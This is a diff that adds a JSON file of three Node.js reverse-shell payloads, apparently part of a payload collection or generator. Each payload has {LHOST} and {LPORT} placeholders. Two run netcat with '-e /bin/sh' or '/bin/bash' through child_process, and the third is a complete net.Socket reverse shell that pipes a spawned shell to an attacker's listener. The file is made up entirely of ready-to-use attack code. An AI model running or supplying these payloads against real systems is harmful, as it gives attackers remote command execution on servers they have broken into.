@@ -1,0 +1,23 @@
+[
+  {
+    "type": "nodejs",
+    "direction": "reverse",
+    "payload": "require('child_process').exec('nc -e /bin/sh {LHOST} {LPORT}')",
+    "note": null,
+    "id": "nodejs1"
+  },
+  {
+    "type": "nodejs",
+    "direction": "reverse",
+    "payload": "-var x = global.process.mainModule.require\n-x('child_process').exec('nc {LHOST} {LPORT} -e /bin/bash')",
+    "note": null,
+    "id": "nodejs2"
+  },
+  {
+    "type": "nodejs",
+    "direction": "reverse",
+    "payload": "(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect({LPORT}, \"{LHOST}\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application form crashing\n})();",
+    "note": null,
+    "id": "nodejs3"
+  }
+]
